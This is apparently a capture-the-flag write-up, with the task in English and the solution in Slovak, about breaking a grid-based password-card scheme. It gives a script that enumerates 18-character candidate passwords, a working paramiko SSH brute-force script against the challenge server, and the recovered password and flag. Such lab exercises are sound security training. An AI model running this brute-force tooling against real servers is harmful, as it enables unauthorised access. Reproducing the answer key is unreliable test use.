# Zadanie #

> Hi, TCC-CSIRT analyst,
> 
> a new colleague came up with a progressive way of creating a memorable password and would like to implement it as a new standard at TCC. Each user receives a TCC-CSIRT password card and determines the password by choosing the starting coordinate, direction, and number of characters. For skeptics about the security of such a solution, he published the card with a challenge to log in to his SSH server.
> 
> Verify if the card method has any weaknesses by logging into the given server.
> 
- > [Download the password card](https://owncloud.cesnet.cz/index.php/s/XELt8f8DUe1BIYI/download "Download the password card")
> (sha256 checksum: `9a35dc6284c8bde03118321b86476cf835a3b48a5fcf09ad6d64af22b9e555ca`)
- > The server has domain name `password-card-rules.cypherfix.tcc` and the colleagues's username is `futurethinker`.

> See you in the next incident!
> 
> **Hint1:**
> The entropy is at first glance significantly lower than that of a randomly generated password.
> 
> **Hint2:**
> We know that the colleague's favorite number is 18, so it can be assumed that the password has this length as well.

----------

# Riešenie #

Ako hovorí úloha, potrebujeme sa prihlásiť na server `password-card-rules.cypherfix.tcc` pod používateľom `futurethinker`, pričom jeho heslo nepoznáme, ale máme password card, na základe ktorej je možné odvodiť heslo.

Ako napovedá hint, heslo má 18 znakov, čím sa nám podľa karty, ktorá obsahuje znaky A-Z a hviezdičky * v matici, resp mriežke 26*19 a heslo je sled znakov po sebe idúcich práve v jednom smere od ľubovolného začiatočného bodu, kým nedosiahne jeho dĺžku alebo nenarazí na okraj. Tým sa nám množina platných hesiel výrazne zúži.

Vygenerujeme si teda súbor s heslami jedným python scriptom 

```
def extract_password(card, start_row, start_col, direction, length=18):
    # definovanie smerov
    moves = {
        'right': (0, 1),
        'left': (0, -1),
        'down': (1, 0),
        'up': (-1, 0),
        'down_right': (1, 1),
        'down_left': (1, -1),
        'up_right': (-1, 1),
        'up_left': (-1, -1)
    }
    
    row, col = start_row, start_col
    move_row, move_col = moves[direction]
    password = ''
    
    for _ in range(length):
        if row < 0 or row >= len(card) or col < 0 or col >= len(card[0]):
            return None  
        password += card[row][col]
        row += move_row
        col += move_col
    
    return password

def generate_passwords(card):
    directions = ['right', 'left', 'down', 'up', 'down_right', 'down_left', 'up_right', 'up_left']
    passwords = []
    
    for row in range(len(card)):
        for col in range(len(card[0])):
            for direction in directions:
                password = extract_password(card, row, col, direction)
                if password:
                    passwords.append(password)
    return passwords

card = [
    list("SQUIRREL*JUDGE*NEWS*LESSON"),
    list("WORRY*UPDATE*SEAFOOD*CROSS"),
    list("CHAPTER*SPEEDBUMP*CHECKERS"),
    list("PHONE*HOPE*NOTEBOOK*ORANGE"),
    list("CARTOONS*CLEAN*TODAY*ENTER"),
    list("ZEBRA*PATH*VALUABLE*MARINE"),
    list("VOLUME*REDUCE*LETTUCE*GOAL"),
    list("BUFFALOS*THE*CATCH*SUPREME"),
    list("LONG*OCTOPUS*SEASON*SCHEME"),
    list("CARAVAN*TOBACCO*WORM*XENON"),
    list("PUPPYLIKE*WHATEVER*POPULAR"),
    list("SALAD*UNKNOWN*SQUATS*AUDIT"),
    list("HOUR*NEWBORN*TURN*WORKSHOP"),
    list("USEFUL*OFFSHORE*TOAST*BOOK"),
    list("COMPANY*FREQUENCY*NINETEEN"),
    list("AMOUNT*CREATE*HOUSE*FOREST"),
    list("BATTERY*GOLDEN*ROOT*WHEELS"),
    list("SHEEP*HOLIDAY*APPLE*LAWYER"),
    list("SUMMER*HORSE*WATER*SULPHUR")
]

all_passwords = generate_passwords(card)
with open('passwords.txt', 'w') as outfile:
    for password in all_passwords:
        outfile.write(password+"\n")
        outfile.flush()
        print(password)

```

do súboru passwords.txt sa nám vygenerovalo 518 potenciálnych hesiel, ktoré použijeme na brute force attack, kým sa nedostaneme k správnemu heslo, na to máme ďalší skript

```
import paramiko
import time
import sys
import os

def ssh_brute_force(host, port, username, password_file, delay=1):
    sys.stderr = open(os.devnull, 'w')

    with open(password_file, 'r') as file:
        passwords = file.read().splitlines()

    for i, password in enumerate(passwords, start=1):
        while True:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                print(f"Pokus {i}: Skusam heslo: {password}")
                client.connect(hostname=host, port=port, username=username, password=password, timeout=5)
                
                print(f"Heslo je: {password} (Pokus {i})")

                session = client.get_transport().open_session()
                if session.recv_ready():  # Skusime ziskat banner po prihlaseni
                    server_message = session.recv(4096).decode().strip() 
                    print(f"Prihlasenie uspesne! Odpoved servera:\n {server_message}")
                else:
                    print("Prihlasenie uspesne! Ziadna uvodna sprava od servera.")
                return password
            except paramiko.AuthenticationException:
                print("Heslo naplatne.")
                break  # Ideme na ďalšie heslo
            except paramiko.SSHException:
                time.sleep(delay)
                continue
            except Exception:
                print("Oh shit!")
                break
            finally:
                client.close()
            time.sleep(delay)
    
    print("Ziadne heslo sa nenaslo!")
    return None

# SSH parametre
host = "password-card-rules.cypherfix.tcc"
port = 22
username = "futurethinker"
password_file = "passwords.txt"

# Go go go
ssh_brute_force(host, port, username, password_file)

```

Našli sme heslo SAOPUNUKTPHCANEMFW, ktoré použijeme pre prihlásenie. Po prihlásení sa nám zobrazí banner spolu s vlajkou.

    $ ssh -l futurethinker password-card-rules.cypherfix.tcc
    futurethinker@password-card-rules.cypherfix.tcc's password:

    Nobody will ever read this message anyway, because the TCC password card is super secure. Even my lunch access-code is safe here: FLAG{uNZm-GGVK-JbxV-1DIx}
    Connection to password-card-rules.cypherfix.tcc closed.

----------

## Vlajka ##
    FLAG{uNZm-GGVK-JbxV-1DIx}